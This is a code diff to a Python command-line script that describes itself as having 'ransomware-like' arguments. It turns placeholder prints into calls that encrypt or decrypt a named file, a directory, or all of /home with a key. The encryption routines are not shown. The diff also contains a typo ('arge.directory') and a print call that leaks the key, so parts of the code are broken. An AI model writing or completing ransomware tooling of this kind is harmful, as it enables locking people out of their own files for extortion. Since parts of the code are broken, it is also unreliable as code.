@@ -19,7 +19,7 @@ import argparse
 # else:
 # 	print("Please provide exactly one command line argument.")
 
-def main():
+def main(key):
 	parser = argparse.ArgumentParser(description="Example script with ransomware-like command-line arguments.")
 
 	group = parser.add_mutually_exclusive_group()
@@ -36,22 +36,28 @@ def main():
 	if args.encrypt:
 		print("User passed -en or --encrypt")
 		if args.all:
-			print("encrypt all")
+			encrypt_directory("/home", key)
+			print("ALL FILES ARE ENCRYPTED")
 		elif args.directory:
-			print("encrypt specified dir")
+			encrypt_directory(f"{args.directory}", key)
+			print(f"DIRECTORY {args.directory} IS ENCRYPTED")
 		elif args.file:
-			print("encrypt specified file")
+			encrypt_specific_file(f"{args.file}", key)
+			print(f"{args.file} IS ENCRYPTED")
 		else:
 			print("Invalid usage. Use -a, -d <DIRECTORY_PATH>, or -f <FILE_PATH>.")
 
 	elif args.decrypt:
 		print("User passed -de or --decrypt")
 		if args.all:
-			print("decrypt all")
+			decrypt_directory("/home", key)
+			print("ALL FILES ARE DECRYPTED")
 		elif args.directory:
-			print("decrypt specified dir")
+			decrypt_directory(f"{args.directory}", key)
+			print(f"DIRECTORY {arge.directory} IS DECRYPTED", key)
 		elif args.file:
-			print("decrypt specified file")
+			decrypt_specific_file(f"{args.file}", key)
+			print(f"{args.file} IS DECRYPTED")
 		else:
 			print("Invalid usage. Use -a, -d <DIRECTORY_PATH>, or -f <FILE_PATH>.")
 	else:
